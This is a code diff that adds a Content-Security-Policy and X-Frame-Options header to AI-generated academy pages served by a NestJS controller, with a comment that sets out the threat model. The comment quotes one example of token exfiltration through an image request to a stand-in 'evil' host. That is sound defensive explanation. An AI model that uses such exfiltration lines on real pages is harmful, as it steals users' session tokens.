@@ -11,6 +11,53 @@ function clampLimit(raw: unknown, def = 6): number {
   return Math.min(24, Math.max(1, n));
 }
 
+/**
+ * The one policy that applies to AI-generated academy pages.
+ *
+ * `main.ts` turns helmet's CSP off globally, because the same process serves
+ * the SPA and an over-strict default would break it. That left generated HTML
+ * — the one thing on this origin assembled from teacher-supplied text — with
+ * no policy at all, on the same origin as the app whose tokens live in
+ * `localStorage`.
+ *
+ * ── What this does and does not fix ───────────────────────────────────────
+ *
+ * It does **not** stop a generated page reading the session. It cannot: the
+ * page is deliberately same-origin and `signed-in-cta.ts` relies on exactly
+ * that to turn "sign up" into "see their courses" for a student who already
+ * has an account. That coupling is a product decision, and undoing it is a
+ * bigger change than a header.
+ *
+ * What it does is close the ways a token would leave the browser.
+ * `connect-src 'self'` blocks fetch, XHR, WebSocket and sendBeacon to anywhere
+ * but this origin, and `img-src` without a wildcard blocks the oldest trick of
+ * all — `new Image().src = 'https://evil/?t=' + token`. An injected script can
+ * still run; it can no longer phone home.
+ *
+ * `'unsafe-inline'` is present for scripts and styles and is not an oversight:
+ * the compiled page is inline by construction, and the signed-in CTA is
+ * injected as an inline `<script>` at serve time. Removing it means nonces
+ * through the whole renderer, which is a change to how pages are built rather
+ * than how they are served.
+ *
+ * Every source here is one the template actually uses: Google Fonts for the
+ * stylesheet and the font files, `data:`/`blob:` for inlined avatars and
+ * thumbnails, and `'self'` for the courses fetch and for media the API streams
+ * from private storage.
+ */
+const GENERATED_SITE_CSP = [
+  "default-src 'none'",
+  "script-src 'self' 'unsafe-inline'",
+  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
+  "font-src 'self' https://fonts.gstatic.com data:",
+  "img-src 'self' data: blob:",
+  "connect-src 'self'",
+  "form-action 'self'",
+  "frame-ancestors 'self'",
+  "base-uri 'none'",
+  "object-src 'none'",
+].join('; ');
+
 @ApiTags('academy-studio/public')
 @Public()
 @Controller()
@@ -32,6 +79,10 @@ export class PublicSiteController {
     }
     res.setHeader('ETag', etag);
     res.setHeader('Cache-Control', 'public, max-age=60, stale-while-revalidate=600');
+    res.setHeader('Content-Security-Policy', GENERATED_SITE_CSP);
+    // Belt and braces with img-src/connect-src below: a generated page has no
+    // business framing anything or being framed by anyone but this app.
+    res.setHeader('X-Frame-Options', 'SAMEORIGIN');
     // A student who is already signed in gets a way into the app instead of a
     // sign-up form for an account they have. See signed-in-cta.ts for why this
     // is applied here and not in the template.
